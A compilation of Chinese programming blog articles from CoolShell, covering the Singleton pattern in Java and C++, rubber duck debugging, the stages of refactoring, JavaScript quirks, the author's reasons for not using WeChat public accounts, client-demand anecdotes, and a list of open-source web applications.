2）这个关键字会禁止指令重排序优化。也就是说，在 volatile 变量的赋值操作后面会有一个内存屏障（生成的汇编代码上），读操作不会被重排序到内存屏障之前。但是，这个事情仅在Java 1.5版后有用，1.5版之前用这个变量也有问题，因为老版本的Java的内存模型是有缺陷的。#### **Singleton 的简化版本**上面的玩法实在是太复杂了，一点也不优雅，下面是一种更为优雅的方式：这种方法非常简单，因为单例的实例被声明成 static 和 final 变量了，在第一次加载类到内存中时就会初始化，所以创建实例本身是线程安全的。但是，这种玩法的最大问题是——当这个类被加载的时候，new Singleton() 这句话就会被执行，就算是getInstance()没有被调用，类也被初始化了。于是， **这个可能会与我们想要的行为不一样，比如，我的类的构造函数中，有一些事可能需要依赖于别的类干的一些事（比如某个配置文件，或是某个被其它类创建的资源），我们希望他能在我第一次getInstance()时才被真正的创建。这样，我们可以控制真正的类创建的时刻，而不是把类的创建委托给了类装载器** 。
好吧，我们还得绕一下：下面的这个1.6版是老版《Effective Java》中推荐的方式。上面这种方式，仍然使用JVM本身机制保证了线程安全问题；由于 SingletonHolder 是私有的，除了 getInstance() 之外没有办法访问它，因此它只有在getInstance()被调用时才会真正创建；同时读取实例的时候不会进行同步，没有性能缺陷；也不依赖 JDK 版本。#### **Singleton 优雅** 版本居然用枚举！！看上去好牛逼，通过EasySingleton.INSTANCE来访问，这比调用getInstance()方法简单多了。默认枚举实例的创建是线程安全的，所以不需要担心线程安全的问题。但是在枚举中的其他任何方法的线程安全由程序员自己负责。还有防止上面的通过反射机制调用私用构造器。**这个版本基本上消除了绝大多数的问题。代码也非常简单，实在无法不用。这也是新版的《Effective Java》中推荐的模式。**#### **Singleton的其它问题**怎么？还有问题？！当然还有，请记住下面这条规则——“ **无论你的代码写得有多好，其只能在特定的范围内工作，超出这个范围就要出Bug了** ”，这是“陈式第一定理”，呵呵。你能想一想还有什么情况会让这个我们上面的代码出问题吗？
在C++下，我不是很好举例，但是在Java的环境下，嘿嘿，还是让我们来看看下面的一些反例和一些别的事情的讨论（ **当然，有些反例可能属于钻牛角尖，可能有点学院派，不过也不排除其实际可能性，就算是提个醒吧** ）：**其一、Class Loader** 。不知道你对Java的Class Loader熟悉吗？“类装载器”？！C++可没有这个东西啊。这是Java动态性的核心。顾名思义，类装载器是用来把类(class)装载进JVM的。JVM规范定义了两种类型的类装载器：启动内装载器(bootstrap)和用户自定义装载器(user- defined class loader)。 在一个JVM中可能存在多个ClassLoader，每个ClassLoader拥有自己的NameSpace。一个ClassLoader只能拥有一个class对象类型的实例，但是不同的ClassLoader可能拥有相同的class对象实例，这时可能产生致命的问题。如ClassLoaderA，装载了类A的类型实例A1，而ClassLoaderB，也装载了类A的对象实例A2。逻辑上讲A1=A2，但是由于A1和A2来自于不同的ClassLoader，它们实际上是完全不同的，如果A中定义了一个静态变量c，则c在不同的ClassLoader中的值是不同的。
于是，如果咱们的Singleton 1.3版本如果面对着多个Class Loader会怎么样？呵呵，多个实例同样会被多个Class Loader创建出来，当然，这个有点牵强，不过他确实存在。难道我们还要整出个1.4版吗？可是，我们怎么可能在我的Singleton类中操作Class Loader啊？是的，你根本不可能。在这种情况下，你能做的只有是——“保证多个Class Loader不会装载同一个Singleton”。**其二、序例化。** 如果我们的这个Singleton类是一个关于我们程序配置信息的类。我们需要它有序列化的功能，那么，当反序列化的时候，我们将无法控制别人不多次反序列化。不过，我们可以利用一下Serializable接口的readResolve()方法，比如：**其三、多个Java虚拟机。** 如果我们的程序运行在多个Java的虚拟机中。什么？多个虚拟机？这是一种什么样的情况啊。嗯，这种情况是有点极端，不过还是可能出现，比如EJB或RMI之流的东西。要在这种环境下避免多实例，看来只能通过良好的设计或非技术来解决了。**其四，volatile变量。** 关于volatile这个关键字所声明的变量可以被看作是一种 “程度较轻的同步synchronized”；与 synchronized 块相比，volatile 变量所需的编码较少，并且运行时开销也较少，但是它所能实现的功能也仅是synchronized的一部分。当然，如前面所述，我们需要的Singleton只是在创建的时候线程同步，而后面的读取则不需要同步。所以，volatile变量并不能帮助我们即能解决问题，又有好的性能。而且，这种变量只能在JDK 1.5+版后才能使用。
**其五、关于继承。** 是的，继承于Singleton后的子类也有可能造成多实例的问题。不过，因为我们早把Singleton的构造函数声明成了私有的，所以也就杜绝了继承这种事情。**其六，关于代码重用。** 也话我们的系统中有很多个类需要用到这个模式，如果我们在每一个类都中有这样的代码，那么就显得有点傻了。那么，我们是否可以使用一种方法，把这具模式抽象出去？在C++下这是很容易的，因为有模板和友元，还支持栈上分配内存，所以比较容易一些（程序如下所示），Java下可能比较复杂一些，聪明的你知道怎么做吗？template class Singleton     {     public:     static T& Instance()     {     static T theSingleInstance; //假设T有一个protected默认构造函数     return theSingleInstance;     }     };public:     int GetExampleData() const {return example_data;}     protected:     OnlyOne(): example_data(42) {}   // 默认构造函数     OnlyOne(OnlyOne&) {}     };
**(** **转载时请注明作者和出处。未经许可，请勿用于商业用途 )**（全文完）# 橡皮鸭程序调试法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Rubber Duck Debugging下面，让我来为你介绍一个程序调试大法——“橡皮鸭程序调试法”，这个方法在调试界是很出众的，实施起来相当方便和简易，几乎可以随时随地地实验，几乎不需要借助任何的软件和硬件的支持，你甚至可以把你的程序打印出来，在纸面上进行调试。那么，为什么这个方法要叫做橡皮鸭呢？因为橡皮鸭子是西方人在泡澡时最喜欢玩的一个小玩具，所以，这个东西应该家家户户都必备的。因为，这个方法由西方人发明，所以，就被取名为“橡皮鸭”了。好了，话不多说，下面是整个调试方法的流程。1. 找一个橡皮鸭子。你可以去借，去偷，去抢，去买，自己制作……反正你要搞到一个橡皮鸭子。   2. 把这个橡皮鸭子放在你跟前。标准做法是放在你的桌子上，电脑显示器边，或是键盘边，反正是你的跟前，面朝你。   3. 然后，打开你的源代码。不管是电脑里的还是打印出来的。   4. 对着那只橡皮鸭子，把你写下的所有代码，一行一行地，精心地，向这只橡皮鸭子解释清楚。记住，这是解释，你需要解释出你的想法，思路，观点。不然，那只能算是表述，而不是解释。   5. 当你在向这只始终保持沉默的橡皮鸭子解释的过程中，你会发现你的想法，观点，或思路和实际的代码相偏离了，于是你也就找到了代码中的bug。   6. 找到了BUG，一定要记得感谢一下那个橡皮鸭子哦。
什么？你觉得这个方法太“愚蠢”，太“弱智”了？是的，看上去，会这样做的人脑子好像是有点毛病。不过，我要告诉你的是，这个方法的确有效。 **因为，这就是“Code Review”的雏形** ！下面让我来给你解释一下。> Once a problem is described in sufficient detail, its solution is obvious.上面这句话的意思是> 一旦一个问题被充分地描述了他的细节，那么解决方法也是显而易见的。我相信在座的各位都有过这样的经历，当你死活都找不到问题的原因的时候，当你寻求他人的帮助时，对别人解释整个你的想法和意图或是问题背景的时候，你自己都没有解释完，就已经找到问题的原因了。这样的经历，相信大家一定有过。这就是这个方法的意义所在。所以，“橡皮鸭”只是一个形式，其主要目的是要你把自己写的代码做“自查”，也就是自己解释给自己听。当然，为了不让你像个“精神分裂”的程序员，引入“橡皮鸭”是很有必要的（虽然这样还是有点精神病，但比起精神分裂来说算是好的了，嘻嘻）。所以，真实的本质是Code Review。关于代码评审，大家可以看一下我的这篇文章《Code Review中的几个提示》，你会明白其中更多的东西的。
最后，我想和大家说一下道具“橡皮鸭”。是的，在我们的身边，你不一定能找得“橡皮鸭”，但你可以找到你你的同事，你的朋友，来做这个“橡皮鸭”，当然，他们并不一定有“橡皮鸭”好使，因为你的那些同事或朋友一定会在你解释的时候，随意地发表意见和看法，相当的令人annoying。《Code Review中的几个提示》和《结对编程的利与弊》也谈到了一些，供你借鉴。（全文完）# 重构代码的7个阶段作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn你曾去想重构一个很老的模块，但是你只看了一眼你就恶心极了。文档，奇怪的函数和类的命名，等等，整个模块就像一个带着脚镣的衣衫褴褛的人，虽然能走，但是其已经让人感到很不舒服。面对这种情况，真正的程序员会是不会认输的，他们会接受挑战认真分析，那怕重写也在所不惜。最终那个模块会被他们重构，就像以前和大家介绍过的那些令人销魂的编程方式中的屠宰式编程一样。下面是重构代码的几个阶段，文章来自：The 7 stages of refactoring，下面的翻译只是意译。**第一阶段 – 绝望******在你开始去查看你想要重构的模块的，你会觉得好像很简单，这里需要改一个类，那里需要改两到三个函数，重写几个函数，看上去没什么大不了的，一两天就搞定了。于是你着手开始重构，然后当你调整重构了一些代码，比如改了一些命名，修理了一些逻辑，渐渐地，你会发现这个怪物原来体型这么大，你会看到与代码不符甚至含糊不清的注释，完全摸不着头脑的数据结构，还有一些看似不需要方法被调了几次，你还会发现无法搞清一个函数调用链上的逻辑。你感到这个事可能一周都搞不定，你开始绝望了。
**第二阶段 – 找最简单的做******你承认你要重构的这个模块就是一个可怕的怪物，不是一两下就可以搞定的，于是你开始着干一些简单的事，比如重新命名一下几个函数，移除一些代码的阻碍，产生几个常量来消除magic number，等等，你知道这样做至少不会让代码变得更糟糕。**第三阶段 – 再次绝望******但是接下来的事会让你再次撞墙。你会发现那些代码的瑕疵是些不痛不痒的事，改正这些事完全于事无补，你应该要做的事就是重写所有的东西。但是你却没有时间这么干，而这些代码剪不乱理还乱，耦合得太多，让你再一次绝望。所以，你只能部分重写那些不会花太多时间的部分，这样至少可以让这些老的代码能被更多的重用。虽然不完美，但是至少可以试试。**第四阶段 – 开始乐观**在你试着部分重构这个模块几天之后，随着重构了几个单元后，虽然你发现改善代码的进度太慢了，但此时，你已知道代码应该要被改成什么样，你在痛苦之后也锁定了那些那修改的类。是的，虽然你的时间预算已经超支，虽然要干的事比较多，但你还是充满希望，觉得那是值得的。你胸中的那团火又被点燃了。**第五阶段 – 快速了结**在这个时候，你发现你已花了太多的时间，而情况越来越复杂，你感到你所面对的情况越来越让你越到不安，你明白你自己已经陷入了困境。你原本以为只需要一次简单的重构，然而现在你要面对的是重写所有的东西。你开始意识到原因是因为你是一个完美主义者，你想让代码变得完美。于是你开始在怠慢你文档，并想找到一个捷径来重写老的代码，你开始采用一些简单而粗暴，快速而有点肮脏的方法。虽然不是很完美，但你就是这样去做了。然后，你开始运行测试做UT，发现UT报告上全是红色，几乎全都失败了，你恐慌了，于是快速地fix代码，然后让UT 能工作。此时，你拍拍自己胸口，说到，没问题 ，于是就把代码提交了。
**第六阶段 – 修改大量的Bug**你的重写并不完美，虽然其过了测试，但是那些UT测试对于你的新的代码有点不太合适，虽然他们都没有报错，但是他们测试得范围太小了，没有覆盖到所有的情况和边界。所以，在这以后，你还需要几周或是更长的时间不得不来修正越来越多的bug，这使得你的设计和代码在每一次quick- fix后就变得越来越难看。此时，代码已经不像你所期望的那样完美了，但你依然觉得他还是比一开始要好一些。这个阶段可能历经几个月。**第七阶段 – 觉悟**经过了6个月，你重写的模块又出了一个比较严重的bug。这让你重构的那个模块变得更难堪。你发现出的这个问题是和当初的设计不一致，你还发现被你重构掉的那段老的代码并不是当初看上去的那么坏，那段老的代码确实考虑到了一些你未曾考虑到的事情。这个时候，你团队里有人站出来说这个模块应该被重构或是重写，而你却不动声色地一言不发，并希望那个站出来的人能在几个月后能觉悟起来。——————不知道这是不是你的经历，我经历过很多次这样的事。对于很多维护性质的项目，我犯过的错误让我成了一个实实在在的保守派，我几乎不敢动，那怕看到代码很不合口味。当然，那些从来没有写过代码的敏捷咨询师一定会说用TDD或是UT可以让你的重构更有效也更容易，因为这样会让他们显得更我价值，但我想告诉你，这种脱离实际的说法很不负责任，这就好比说—— **我在杀猪的时候遇到了一些麻烦，因为我对猪的生理结构不清楚，或是这本来就是一头畸形的猪，导致我杀的猪很难看，而伟大的敏捷咨询师却告诉我，要用一把更快更漂亮的刀** 。软件开发永远不是那么简单的事，杀猪也一样。
# WTF Javascript作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn请先看一下下面的这段Javascript程序以及其结果。[javascript]   1 + + 1 // => 2   1 + – + 1 // => 0   1 + – + – + 1 // => 2   1 + – + – + – + 1 // => 0   1 + – + + + – + 1 // => 2   1 + / + + + / + 1 // => 1/ + + + /1   [/javascript]提示一下，1++1等价于1 + (+1)，也就是1加上一个正数1，如果你能搞懂其它的表达式的话，请看看下面的这段程序，你能说出其结果吗？[javascript]   1 + / + / + / + 1 // => ?   [/javascript]如果不知道的话，你可以到这个网页上去讨论讨论。当然，如果你不懂也没有什么关系，因为Javascript本身就是一个很怪异的语言，再加上浏览器的种种不是，所以，Javascript程序员也是很郁闷的。在以前的“最为奇怪的程序语言的特性”中也说过一些。Javascript最怪异的特性导致了wtfjs.com这样的一个网站，还有一个WTF JS的开源站点。呵呵。
# 为什么我不在微信公众号上写文章作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Community很多朋友问我为什么不在微信公众号上写文章。我都没有直接回答，老实说，我也是扭扭捏捏的，才去开了个个人的微信的公众号，而且还只是为了使用微服小程序，和文章的发布通知，我承认现在的阅读都在移动端，而且微信的公众号是国内移动端的文章流量及分享的入口，但是我还是更愿意使用blog这样的方式分享文章，最多也是在blog这边写好文章后，再去微信公众号那边通知一下。这个原因，不是因为我是一个老顽固，有习惯思维，而是，我不觉得微信公众号是一个好的信息传播和交流的平台。**我下面的言论仅仅代表我的个人观点，我不想强加给别人，我只是想说明一下为什么我不把我的blog迁移到微信公众号上。**首先，互联网是开放和共享的，不是封闭的。信息的传播更是需要开放的，大家可以看看互联网之子。* 我希望我的文章能够被rss feed到各种阅读器中。   * 我希望我的文章能有更长的生命周期，长到十几年前的文章都会有人来读。   * 我希望我的文章可以被搜索引擎所检索到。   * 我希望我的文章能被别人整理，与其它人的文章放在一起互补并引用。   * 我希望我的文章能被修改，因为文章会有错误，也会需要时常更新。
然而，微信公众号都不能很好的支持。我希望我的文章能成为生态圈的里的一部份。所谓生态圈是相互融合，不是唯我独尊。这个和做开源软件的道理一样，开源软件不是把源代码开出来就好了，而是要去和已有的其它软件互相融合，互相兼容，互相支持，这本就是软件设计的真谛（参看《UNIX编程艺术》）。所以，我想，写文章也一样。下面是我觉得文章传播的姿势。#### 文章传播的姿势**我希望我的文章是被检索的，这意味着，就算文章写过了好多年，它依然可以被检索到，而不是在社交圈上被大众转了3-4天后就完了，然后再也没有然后了** 。今天，我十多年前写的文章依然可以被检索到，依然对后来的新人有帮助。因为我的文章被搜索引擎检索了，我的文章被转载fork出去了，被人引用和标注，所以，可以长期被传播。今天的酷壳（CoolShell.cn）已经很长时间没有更新了，然而里面的很多文章依然在被转发着，在被搜索着，在被重复阅读和被人推荐着，文章不断的被后来的人阅读。这就是被检索被共享被转载的好处。同时，我并不希望成为某个平台写文章的苦力。在微信公众号下，你需要不断的更新才会积累起人气（订阅者），而文章的保鲜期非常有限，因为不能被检索，所以，你写的越多，你过去的文章也会被遗忘的越快。 **而微信公众平台让能写文章的人好像成为了这个平台的一个写作的奴隶，而不是让他们的文章中的内容和观点可以有长时间的影响力** 。换言之，在社交网络上，如果你要有影响力，你就要使劲写，需要更多的粉丝和订阅者。我个人认为这是违反了信息传播规律的。
**最重要的是，我希望我的文章和观点是有讨论的，希望我的文章能被指正和批评，最好是引发讨论和思辨** ，这样才会让我们每一个人都可以在交流中成长。 **很多时候，文章本身并没有什么太大的价值，而引发的讨论和思辨才更有价值，这是我认为文章传播最正确的姿势。而微信的公众号在讨论方面人为的阻止或大大消弱了大家的沟通和讨论（尤其是精选评论）** 。虽然我承认有些讨论也是无效的，而且还有漫骂和跑题，但是我依然觉得百花齐放的讨论的利大于弊。我私以为， **信息的传播正确姿势，是被检索、讨论、引用、整理、补充和更新，而不是社交网络的转发、点赞、粉丝、订阅和打赏** 。换句话说， **我关注的是的文章的长期价值，而不是短期的表象** 。#### 关于文章的版权很多人认为，封闭的平台有个比开放平台天然的优势，就是盗版和抄袭的问题，可以通过平台举报和惩罚对方。我以前也受到一些被抄袭和盗用的困扰，还曾经拿起来法律的武器维护自己的权利。可能是我经历这样的事情比较早，所以，我今天在这个问题上不纠结了。1、好的有价值的文章总是被人盗用抄袭的，这也算是对作者的一种认可吧。2、我从来没有见过有人靠抄袭和盗用别人文章而成功的，无非就是收获几个赞罢了。
3、原创文章被人过抄袭和盗用，反而容易得到更多的关注。**微信公众号的原创保护也只是局限在微信上，微信之外的平台，它也无能为力，所以，对于我的文章会被转到很多地方的这种情况来看，微信公众号的原创保护也非常有限。**现在，我倒是不纠结有人会盗用和抄袭我的文章，因为，一方面，你可以有一些小伎俩来保护你的文章，比如在文章内容中放入一些你自己特有的标识，另一方面，我的文章被人盗用了抄袭的时候，总有一些网友能在盗用者那边指出来原文章是什么，并批评之。 **所以，还是应该把主要精力放在文章的内容和质量上，并让文章可以被检索和被更多的地方所引用，这样，你的文章才会得到最大的保护** 。另外， **既然别人对我的文章有抄袭和盗用的需求，要不我就让别人干得更体面一些。所以，我的文章完全可以自由的转载，但不得用于商业目的，只需要注明作者和出处就好了** 。#### 关于写文章挣钱首先，如果你觉得在微信公众号上写技术文章是可以挣钱的，那么恐怕你搞错了，营销文是可以的，技术文章还是比较难的。当然，你要挣点小钱是可以有的，但是，你需要写软文中植入广告，或是消费热点主题，比如前段时间的魏则西事件，有的公众号被打赏了一些钱。
老实说，这对我来说完全无感，因为，我的逻辑是这样的： **我觉得一个人有一定的影响力，其中有很大一部份原因来自他的独立性，如果我开始写软文了，相当于我把自己卖了** 。所以，我现在从来不通过写文章挣钱，因为我会写代码，我还是通过我的技能挣钱，通过给一些公司做咨询、培训、企业服务挣钱，老实说，靠自己的能力挣钱，比写文章挣钱挣得多多了，因为我觉得， **像我写的这类的文章本来就是用来分享和传播的，不是用来挣钱的。写文章的目的是分享和影响，不是挣钱。**关于独立性，这里说两个花絮吧——我在Amazon的时候，我和公司讲，我想在我的博客上写几篇关于亚马逊的文章，介绍亚马逊的技术和一些做事的方法，也算是个宣传，让我的团队也好招人，但是，我当时的老板和我说，你的博客之所以有影响力是因为你的独立性，不要写亚马逊的，这样会把你自己卖了，千万别这么做。然而，我在Alibaba的时候，我的大老板要求我用我的博客和微博帮阿里云做营销，我非常委婉地拒绝了，结果，团队合作的价值观不达标了。呵呵。P.S. 本来酷壳上是不做广告的，今天，酷壳上也广告，但是广告费是全部捐给Wikipedia的，广告主的钱是没有到我的手的。
微信公众号上的文章都有软文和广告植放，我觉得这不是我的调调，我害怕微信公众平台的整体格调影响了我的格调。就好像我认为我的网络被百度检索到了会我的网站的格调下降好几个档次。所以，我还是保持一定的距离吧。**这么说吧，我写文章不是为了挣钱，我也不认为写文章能挣到钱，我写文章就是为了分享和影响，我会借助社交网络，但不会寄宿在社交网络上，更不会被社交网络所绑架。**谢谢看我的唠叨！（全文完）# 这到底是谁之错？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【感谢 @风枫峰 投递本文】**故事一：**   背景介绍：RT是一个外包公司，ZWZX是项目承接公司，YD是甲方。RT公司每天下班的时候都会接到ZWZX负责人的电话，询问一天的工作情况，然后布置任务要求晚上加班做完，RT公司的员工很无奈也很气愤因为每天都要加班，员工们就问项目经理：“为什么天天加班赶需求，今天才提一个需求，明天就要上线，还让不让人活了?” 项目经理无奈的说：“我有什么办法啊？这是人家ZWZX负责人说的啊，对方逼得紧。”多次以后项目经理也忍不住了，就问ZWZX的负责人怎么天天这样啊，ZWZX的负责人就说了:”明天就要向YD的负责人展示这个页面，我也没有办法啊？YD那边老总就是这么要求的，我怎么办，我也不想这样啊？”
然后RT的项目经理实在受不了了就辞职了，新上任的项目经理又会走他的老路，因为从开始我们就被培养“满足客户的需求是最重要的”。RT的员工也就这样一直抱怨着，一直忍受着。天天在心里咒骂YD的老总真是没有人性，不拿人当人看啊！人换了一批又一批，加班也就慢慢的变成了应该的，你不加班说明你不敬业，不合格。**故事二：**   IE6一直存活着，所有的前端开发人员都痛恨它，都不想兼容它，可是产品经理看到IE6的市场占有率还是这么高，就会要求前端开发人员必须兼容IE6。矛盾又来了，就像故事一一样，前端开发人员天天抱怨，产品经理也天天抱怨，但是面对IE6的市场份额，产品经理会劝开发人员说：“我有什么办法啊？IE6的市场份额就是这么高，不兼容怎么办啊？我也不想啊！” 开发人员也就这样忍受着，然后不断地抱怨用IE6的用户低端，没文化，怎么还用IE6啊！天天兼容IE6就够烦的了，还怎么创新啊！**这两个故事里出现的问题到底是谁的错误引起的？**故事一的罪魁祸首是YD的老总吗？故事二的罪魁祸首是那些还用着IE6的用户吗？从这两个嫌疑最大的罪魁祸首眼中看一下这两个故事：**故事一：**   我是YD的老总，我要建立一个网站，找到了ZWZX公司，签订了合同，我提需求他们实现。
我不懂制作网站，可是我才思敏捷，创意无限，不停的会有好点子从我的脑海里蹦出来，每当有一个好点子蹦出来后，我都会给ZWZX公司的负责人讲清楚我的想法，让他实现，开始我不知道做一个页面需要多长时间。第一次我试探性的说了一周必须把我这个点子做出来，ZWZX公司负责人很痛快的答应了，一周后我果然看到了这个功能。可是会不会我给他们的时间太长了？对！肯定是，要不也不会答应的这么痛快。这些人啊！天天就是想拖时间，好多骗我点钱。点子又来了，这次我要求5天做出来，这个点子和上个点子类似，我倒要看看5天能不能做出来~ ZWZX公司负责人一副痛苦的表情，我会不会逼的太紧了，5天是不是真的做不出来？到时候看看吧，如果5天没做出来估计是我给的时间太少了。5天过去了ZWZX公司的负责人很高兴的拿出了我要的功能实现，哎，看来开始真的骗了我两天。就是不知道5天会不会还是多了啊？下次给3天~又拿出来了，虽然他装的好像时间太紧似的，可别以为我不知道，你第一个功能最多3天就做出来了，我还给了你7天的项目经费，你们多赚了我多少啊！！！！ 真是没良心。 下次1天！！！啊啊啊啊啊啊啊啊!!! 1天就出来了，这些人。。。。。 有没有良心，原来做这个这么简单，以后就给1天，不 ！ 一天N个功能。
**故事二：**   我买了个电脑，没什么别的用途，就是打开电脑上上网，上上QQ和儿子聊聊天，QQ是儿子给我装上的，这样我就可以和他视频了。有一次QQ提醒我说我的QQ版本太低了，不能视频了，我打电话问儿子，儿子说按提示升级一下QQ就行了，呵呵，我按QQ的提示，儿子的指示一步一步的升级QQ成功了，看来电脑也不难啊！**到这里您认为开始的两个故事的罪魁祸首是谁啊？**我们一直以加班，甚至通宵去满足客户不合理的要求，只因为他是客户。只因为人人都认为满足客户的要求是我们最大的   价值，可是不合理的要求不能去拒绝吗？套用刘欢说的一句话“我们是不是活的应该有些尊严”，一味的迎合客户，只会让我们自己越来越痛苦，反而得不到用户的尊重，肯定。我一直有个疑惑，很多人说网站不支持IE6，而选择让用户去升级IE，这样的用户体验不好！如果按照按照这个逻辑，是不是我们都应该是Web应用，而且都应该是IE6下的Web应用呢？为什么微软还要出WIN8，一直XP不是挺好的吗？让用户升级系统，用户体验多么不好啊？QQ，360，搜狗输入法，等等客户端软件用户体验不都不好吗？ 都还要用户下载。实在搞不懂为什么我们做个东西非要去支持IE6呢？检测到用户是IE6，给个提示，给个升级链接不就行了？ 这样做用户体验是有多么不好吗？ 你天天去支持IE6，还要天天磨叽用户使用IE6，你不觉的很矛盾吗？再说我一个普通用户，你如果不提醒，我怎么知道要升级IE6啊？
**对于遭遇了故事一，故事二的人只能送上一句话“哀其不幸，怒其不争！”**原文链接：http://hfcc8685.github.com/blog/2012/04/19/shui-zhi- cuo/# 疯狂的 Web 应用开源项目作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一个Web应用的开源列表。没什么可说的，太疯狂了。尤其是Web 2.0那一堆。我不知道你怎么想，有些开源项目的源码写得挺不好的，尤其是性能方面。或许你会以为改一改他们就可以成为为自己所用，不过，改这些开源的项目还真不容易。玩玩还可以。目录* 数字媒体   * 文件存储   * 内容服务   * Groupware群件   * 纯Web 2.0服务   * 身份和安全   * 其它#### 数字媒体* **相册** （Flickr, Picasa）     * Gallery，基于PHP + MySQL的Web相册。非常易于使用，包括一个配置向导，对于相片的操作包括自动生成缩略图、相片的大小改变、选择、排序等。     * Piwigo，基于PHP + MySQL。配备了强大的功能，发布和管理您的照片，可扩展性和智能浏览功能，如类别，标签，或年表。这是网络和照片的标准要求。扩展使Piwigo更可扩展性和可定制的。     * UberGallery，一个简单易用的相册。PHP。不需要数据库。     * Zenphoto，一个简单的web相册程序,它能够简单的展示你的图片，并含有你所需要的所有功能和特点。可以和Wordpress集成。
* **视频** （YouTube）     * Flowplayer，一个用Flash开发的在Web上的视频播放器，可以很容易将它集成在任何的网页上。支持HTTP以及流媒体传输。     * Plumi，一个建立在Plone 内容管理系统上的视频分享系统，可帮助你轻松建立视频分享网站。* **音乐电台社区** （last.fm, ulike）     * Libre.fm，对Last.fm 的克隆。* **视频电影社区** （netflix, criticker）     * Filmaster，fileaster.com的源码。* **书** （LibraryThing, Shelfari, Goodreads）     * O’Reilly Bookworm，在线电子图书阅读。* **期刊参考论文数据库** （Emerald Insight, Springer Link）     * CiteSeerX，采用机器自动识别技术搜集网上以Postscrip和PDF文件格式存在的学术论文，然后依照引文索引方法标引和链接每一篇文章。（其是CiteSeer的换代产品。1997年，CiteSeer引文搜索引擎由NEC公司在美国普林斯顿研究所的三位研究人员Steve Lawrence, Lee Giles和Kurt Bollacker研制开发。它是利用自动引文标引系统ACI（Autonomous Citation Indexing）建立的第一个科学文献数字图书馆（Scientific Literature Digital Library））。
* **地图** （Google Maps）     * OpenStreetMap，一个可供自由编辑的世界地图，它是由所有的用户创造的。 _OpenStreetMap_ 允许您查看，编辑或者使用世界各地的地理数据来帮助您。其就像Wikipedia一样，全世界的人都可以编辑，据说其上面的数据超过了政府的数据。当然，目前其参与的人数还不够，大量的地方都是白板。#### 文件存储* **文件共享/同步** （DropBox, drop.io, Ubuntu One）     * Tahoe Least-Authority Filesystem，一个云存储分布式文件系统。     * iFolder，一个简单安全的存储解决方案，可在计算机间文件的同步和分享。可以用来随时备份本地的文件。* **存储** （Amazon S3, Imageshack, Box, Variety of models）     * Jesse Vincent’s Prophet，你可以看看他的文档介绍吧。* **在线文件编辑** （Google Docs）     * AbiCollab，基于AbiWord的社群的线上文书处理协作服务。     * Etherpad，基于开放软体的线上文书处理服务，最大的特色在于多人即时共同协作一份文件，软体组织不直接提供服务，而是透过其他没有连系的组织网站提供。
* **虚拟机供应** （Amazon EC2）     * Eucalyptus (computing)")，是一用来通过计算集群或工作站群实现弹性的、实用的云计算。它最初是美国加利福尼亚大学 Santa Barbara 计算机科学学院的一个研究项目，现在已经商业化，发展成为了 Eucalyptus Systems Inc。不过，Eucalyptus 仍然按开源项目那样维护和开发。Eucalyptus Systems 还在基于开源的 Eucalyptus 构建额外的产品；它还提供支持服务。     * Globus Toolkit，Globus项目工具包，其可以在计算机上提供稳定、安全和对等网络的分布式运算，集群和其它高性能系统功能。     * OpenNebula，一个虚拟基础设备引擎， 用来动态布署虚拟机器在一群实体资源上，OpenNEbula 最大的特色在于将虚拟平台从单一实体机器到一群实体资源。#### 内容服务* **Wiki** （Wikispaces）     * Dokuwiki，一个针对小公司文件需求而开发的Wiki引擎。DokuWiki是用程序设计语言PHP开发的并以GPL 2发布。DokuWiki基于文本存储，所以不需要数据库，其数据文件在Wiki系统外也是可读的。DokuWiki的功能齐全，支持UTF-8，最新版支持中文链接。能够单独编辑页面中的某个章节，能够自动生成目录，适合中小企业、个人使用，用作资料归档、指南、读书笔记等。DokuWiki安装很简单，默认提供配置工具。     * Mediawiki，是一套基于网络的Wiki引擎，维基媒体基金会的所有项目乃至众多wiki网站皆采用了这一软件。MediaWiki软件最初是为自由内容百科全书维基百科所开发，今日已被一些公司机构部署为内部的知识管理和内容管理系统。Novell甚而还在多个高流量的网站中使用了该软件。     * μWiki，一个小巧而功能齐全的wiki，所有的代码才3500行，可通过facebook和openID认证。
* **出版**     * Topaz     * Ambra，是一个期刊管理与发布系统。它具有一个高容量、高效、经济的系统来在所有科学领域发表研究文章。     * Open Journal Systems，简称OJS，此系统是一个开源码的期刊管理与出版软件，由公共知识项目(PKP; Public Knowledge Project)研发与支持。（中国肺癌杂志使用了这个系统）* **Blog**     * WordPress，这个不用说了吧。     * LiveJournal，一个综合型SNS交友网站，有论坛，博客等功能，Brad Fitzpatrick始建于1999年4月15日，目的是为了与同学保持联系，之后发展为大型网络社区平台，是网友聚集的好地方， _LJ_ 支持多国语言， _ALEXA_ 综合排名84 ，日均访客可达6,288,000以上* **微博** （Twitter）     * Jisko，界面和Twitter很像，集成Twitter同步功能，它能够自动将你在Jisko平台上发布的内容发表到您的Twitter账户上。也能够自动读取您的Twitter更新，但是并不能将这些内容发布到Jisko平台，只能在自己的好友Timeline里查看。Jisko平台还能够连接您的Jabber/GTalk账户，让您通过IM发帖。并且有数个缩链服务供选择，十分实用。     * Jaiku Engine，Google曾经收购的类Twitter平台Jaiku现在已经完全开源并且切换AppEngine上运行，早前Google曾经宣布停止Jaiku等项目的维护和开发，现在更将Jaiku完全开源提供用户免费下载，所有人都可以在自己的主机上建立和运行自己的Jaiku应用了。     * Status.net，一个开源微博服务。同时，它又可将信息同步到Twitter。所以我们也可以把它理解为“开源的Twitter客户端”。但它与客户端又有本质的不同：拥有自己的数据库，只是把数据同步到推特而已。
